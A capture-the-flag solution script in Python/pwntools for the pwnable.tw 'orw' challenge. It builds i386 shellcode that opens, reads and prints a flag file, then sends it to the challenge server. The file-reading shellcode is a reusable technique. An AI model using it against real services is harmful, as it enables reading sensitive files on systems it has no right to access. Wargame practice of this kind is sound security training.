from pwn import *

context(arch='i386', os='linux')

# sys_open()
shellcode = asm('''
xor 	eax, eax
xor 	ecx, ecx
mov 	eax, 0x5
push 	ecx
push 	0x67616c66
push 	0x2f77726f
push 	0x2f656d6f
push 	0x682f2f2f
mov 	ebx, esp
int 	0x80
''')

# sys_read()
shellcode += asm('''
mov 	eax, 0x3
mov 	ecx, ebx
mov 	ebx, 0x3
mov 	dl, 0x30
int 	0x80
''')

# sys_write()
shellcode += asm('''
mov 	eax, 0x4
mov 	bl, 0x1
int 0x80
''')

# proc = process('./orw')
# gdb.attach(proc, gdbscript='b *main+66')

proc = remote('chall.pwnable.tw', 10001)

proc.recvuntil(':')

proc.send(shellcode)

proc.interactive()
